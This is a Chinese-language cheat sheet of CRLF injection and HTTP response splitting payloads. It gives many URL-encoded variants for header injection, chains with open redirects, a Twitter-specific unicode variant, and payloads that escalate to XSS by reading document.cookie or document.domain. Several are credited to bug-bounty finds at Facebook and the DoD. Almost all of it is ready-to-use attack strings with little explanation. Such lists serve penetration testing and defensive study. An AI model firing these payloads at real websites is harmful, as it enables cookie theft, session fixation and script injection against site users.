## CRLF 注入 || HTTP Response Splitting

```
%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
```

**基于header测试根目录**

```
%0d%0aheader:header
```
```
%0aheader:header
```
```
%0dheader:header
```
```
%23%0dheader:header
```
```
%3f%0dheader:header
```

```
/%250aheader:header
```

```
/%25250aheader:header
```

```
/%%0a0aheader:header
```

```
/%3f%0dheader:header
```

```
/%23%0dheader:header
```

```
/%25%30aheader:header
```

```
/%25%30%61header:header
```

```
/%u000aheader:header
```

**CRLF与Open Redirect服务器配置错误 **

```
//www.google.com/%2f%2e%2e%0d%0aheader:header
```
```
/www.google.com/%2e%2e%2f%0d%0aheader:header
```
```
/google.com/%2F..%0d%0aheader:header
```

**Twitter 特殊的 CRLF** by [@filedescriptor](http://blog.innerht.ml/twitter-crlf-injection/)

```
%E5%98%8A%E5%98%8Dheader:header
```

**CRLF Injection 到 XSS**

```
%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
```

**在302跳转响应之前** (Discovered in DoD)

```
%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert('XSS');%3C%2fscript%3E
```

**响应拆分301代码，与Open Redirect链接以破坏header位置并打破301** by [@black2fan](https://twitter.com/black2fan) (Facebook bug)

_注意：_`xxx：1`用于打开重定向目的地（header头）。 很好的例子如何将CRLF升级到XSS，这似乎是不可利用的301状态代码。

```
%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(document.cookie)%3c/script%3e%2F..%2F..%2F..%2F../tr
```
